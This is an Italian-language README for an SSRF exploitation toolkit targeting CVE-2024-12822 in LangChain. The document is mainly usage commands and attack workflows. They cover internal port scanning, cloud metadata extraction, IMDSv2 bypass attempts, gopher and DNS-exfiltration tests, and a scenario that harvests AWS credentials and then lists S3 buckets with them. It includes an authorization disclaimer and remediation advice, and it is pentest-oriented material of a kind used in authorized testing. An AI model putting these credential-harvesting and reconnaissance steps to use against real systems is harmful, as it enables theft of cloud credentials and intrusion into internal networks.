# Advanced SSRF Exploitation Toolkit

Suite di strumenti avanzati per il testing e l'exploitation di **CVE-2024-12822** - LangChain SSRF vulnerability.

## 🚀 Strumenti Inclusi

### 1. 🎯 Exploit PoC Interattivo (`exploit_poc.py`)

Framework di exploitation interattivo con menu completo per testare SSRF in modo sistematico.

**Caratteristiche:**
- Menu interattivo user-friendly
- Scoperta automatica degli endpoint vulnerabili
- Test SSRF con callback URL
- Estrazione metadata AWS/GCP/Azure
- Port scanning interno
- Modalità automatica completa
- Supporto proxy HTTP

**Utilizzo:**

```bash
# Modalità interattiva
python3 exploit_poc.py -u http://target.com

# Modalità automatica (full exploitation)
python3 exploit_poc.py -u http://target.com --auto

# Estrazione metadata AWS
python3 exploit_poc.py -u http://target.com --aws-metadata

# Port scanning interno
python3 exploit_poc.py -u http://target.com --port-scan 192.168.1.1

# Con proxy (es. Burp Suite)
python3 exploit_poc.py -u http://target.com --proxy http://127.0.0.1:8080
```

**Menu Interattivo:**
1. Scopri endpoint vulnerabili
2. Test SSRF base (richiede callback URL)
3. Estrazione metadata AWS
4. Estrazione metadata GCP
5. Estrazione metadata Azure
6. Scan porte interne
7. Payload SSRF personalizzato
8. Exploitation automatica completa

---

### 2. ☁️ Cloud Metadata Harvester (`cloud_harvester.py`)

Tool specializzato nell'estrazione automatica di credenziali e metadata da ambienti cloud.

**Caratteristiche:**
- Supporto multi-cloud (AWS, GCP, Azure, Alibaba Cloud, DigitalOcean)
- Estrazione automatica credenziali IAM/Service Account
- Bypass IMDSv2 per AWS
- Export credenziali in formato usabile (AWS CLI, gcloud, etc.)
- Export JSON completo
- Output colorato e user-friendly

**Utilizzo:**

```bash
# Harvest completo di tutti i cloud provider
python3 cloud_harvester.py -u http://target.com -e /api/load

# Solo AWS
python3 cloud_harvester.py -u http://target.com -e /api/load --aws

# Solo GCP
python3 cloud_harvester.py -u http://target.com -e /api/load --gcp

# Con export JSON
python3 cloud_harvester.py -u http://target.com -e /api/load -o findings.json

# Export credenziali in formato usabile
python3 cloud_harvester.py -u http://target.com -e /api/load --export-creds
```

**Output:**
- Credenziali AWS (AccessKeyId, SecretAccessKey, SessionToken)
- Token GCP Service Account
- Azure Managed Identity Token
- Metadata completi dell'istanza
- File `harvested_credentials.txt` pronto per l'uso

---

### 3. 🔬 Multi-Vector SSRF Tester (`multi_vector_tester.py`)

Framework avanzato per testare molteplici vettori di attacco SSRF e tecniche di bypass.

**Caratteristiche:**
- **Bypass Techniques:** 15+ tecniche di bypass (IP encoding, URL tricks, IPv6, etc.)
- **Timing Attacks:** Rilevamento blind SSRF tramite timing analysis
- **Protocol Smuggling:** Test con Gopher, Dict, LDAP, etc.
- **DNS Exfiltration:** Test di exfiltration via DNS
- **URL Parser Confusion:** Attacchi di confusione del parser
- **Network Pivoting:** Scansione rete interna
- **Localhost Variations:** Test varianti localhost

**Utilizzo:**

```bash
# Test completo con tutti i vettori
python3 multi_vector_tester.py -u http://target.com -e /api/load

# Solo tecniche di bypass
python3 multi_vector_tester.py -u http://target.com -e /api/load --bypass-only

# Solo timing attack scan
python3 multi_vector_tester.py -u http://target.com -e /api/load --timing-only

# Con DNS exfiltration test
python3 multi_vector_tester.py -u http://target.com -e /api/load --dns-callback your-domain.com

# Con redirect bypass test
python3 multi_vector_tester.py -u http://target.com -e /api/load --redirect-url http://your-redirect-server.com
```

**Tecniche di Bypass Testate:**
- Decimal IP encoding (2130706433)
- Octal IP encoding (0177.0.0.1)
- Hexadecimal encoding (0x7f.0.0.1)
- @ symbol tricks
- IPv6 localhost e AWS
- Protocol smuggling (Gopher, Dict, File)
- DNS rebinding
- URL parser confusion

---

### 4. 📊 Report Generator (`report_generator.py`)

Generatore di report HTML professionali e interattivi per documentare le vulnerabilità.

**Caratteristiche:**
- Design moderno e responsive
- Executive summary
- Dettagli tecnici completi
- Proof of Concept timeline
- Impact assessment con CVSS
- Raccomandazioni di remediation
- Timeline di remediation
- Esportabile e stampabile
- Supporto tema scuro

**Utilizzo:**

```bash
# Report base
python3 report_generator.py -u http://target.com -o report.html

# Da file JSON (output di cloud_harvester)
python3 report_generator.py -u http://target.com -j findings.json -o report.html

# Con severity personalizzata
python3 report_generator.py -u http://target.com -s CRITICAL -o report.html

# Con executive summary personalizzato
python3 report_generator.py -u http://target.com --summary "Custom summary..." -o report.html
```

**Output:**
Report HTML professionale con:
- Executive summary
- CVSS scoring
- Impact assessment
- Findings dettagliati
- PoC step-by-step
- Raccomandazioni immediate e a lungo termine
- Timeline di remediation
- Collegamenti a riferimenti esterni

---

## 🛠️ Installazione

### Requisiti

```bash
pip install -r requirements.txt
```

### Dipendenze
- Python 3.8+
- requests
- colorama

---

## 📋 Workflow Completo di Exploitation

### Step 1: Discovery e Reconnaissance

```bash
# Scopri endpoint vulnerabili
python3 exploit_poc.py -u http://target.com
# Seleziona opzione 1 dal menu
```

### Step 2: Test SSRF Base

```bash
# Verifica SSRF con callback
python3 exploit_poc.py -u http://target.com --callback http://your-callback-server.com
```

### Step 3: Extraction Credenziali Cloud

```bash
# Harvest completo
python3 cloud_harvester.py -u http://target.com -e /api/load -o findings.json --export-creds
```

### Step 4: Advanced Testing

```bash
# Test multi-vettore
python3 multi_vector_tester.py -u http://target.com -e /api/load --dns-callback your-domain.com
```

### Step 5: Reporting

```bash
# Genera report professionale
python3 report_generator.py -u http://target.com -j findings.json -s CRITICAL -o final_report.html
```

---

## 🎯 Esempi Pratici

### Scenario 1: Estrazione Credenziali AWS

```bash
# 1. Harvest AWS metadata
python3 cloud_harvester.py \
    -u http://vulnerable-app.com \
    -e /api/load \
    --aws \
    --export-creds

# 2. Usa le credenziali estratte
source harvested_credentials.txt
aws sts get-caller-identity
aws s3 ls
```

### Scenario 2: Internal Network Reconnaissance

```bash
# Port scan via SSRF
python3 exploit_poc.py \
    -u http://vulnerable-app.com \
    -e /api/load \
    --port-scan 192.168.1.1
```

### Scenario 3: Blind SSRF Detection

```bash
# Timing attack scan
python3 multi_vector_tester.py \
    -u http://vulnerable-app.com \
    -e /api/load \
    --timing-only
```

### Scenario 4: DNS Exfiltration

```bash
# Setup DNS monitoring on your-domain.com
# Then run:
python3 multi_vector_tester.py \
    -u http://vulnerable-app.com \
    -e /api/load \
    --dns-callback your-domain.com
```

---

## 🔒 Note sulla Sicurezza

⚠️ **ATTENZIONE**: Questi strumenti sono destinati ESCLUSIVAMENTE a:
- Security testing autorizzato
- Bug bounty programs
- Penetration testing con consenso scritto
- Ambienti di test personali

**NON utilizzare** su sistemi senza autorizzazione esplicita. L'uso non autorizzato è illegale.

---

## 🎨 Features Avanzate

### Exploit PoC
- ✅ Scoperta automatica endpoint
- ✅ Multi-cloud support
- ✅ Proxy integration
- ✅ Menu interattivo
- ✅ Modalità batch/automated

### Cloud Harvester
- ✅ 5 cloud providers supportati
- ✅ IMDSv2 bypass attempts
- ✅ Credential export format
- ✅ JSON output completo
- ✅ Colorized output

### Multi-Vector Tester
- ✅ 15+ bypass techniques
- ✅ Timing analysis
- ✅ Protocol smuggling
- ✅ DNS exfiltration
- ✅ Network pivoting

### Report Generator
- ✅ HTML professionale
- ✅ Design responsive
- ✅ CVSS scoring
- ✅ Executive summary
- ✅ Print-friendly

---

## 📚 Documentazione Tecnica

### CVE-2024-12822 Details

**Severity:** HIGH (CVSS 8.6)  
**CWE:** CWE-918 (Server-Side Request Forgery)  
**Affected:** LangChain < 0.3.18

**Vulnerability:**
LangChain's document loader and web retrieval components fail to properly validate user-controlled URLs, allowing attackers to:
- Access internal services
- Extract cloud credentials
- Perform network reconnaissance
- Bypass firewall restrictions

### Remediation

1. **Immediate:** Upgrade to LangChain 0.3.18+
2. **Network:** Implement egress filtering
3. **Application:** URL allowlisting
4. **Cloud:** IMDSv2, VPC endpoints
5. **Monitoring:** Log outbound connections

---

## 🤝 Contributing

Contributi benvenuti! Per aggiungere features:
1. Fork the repository
2. Crea feature branch
3. Commit changes
4. Push to branch
5. Apri Pull Request

---

## 📄 License

Apache License 2.0 - Vedi file LICENSE per dettagli.

---

## 👨‍💻 Author

Tsunami Community Contributor

---

## 🔗 References

- [CVE-2024-12822](https://nvd.nist.gov/vuln/detail/CVE-2024-12822)
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [LangChain Security](https://github.com/langchain-ai/langchain/security)
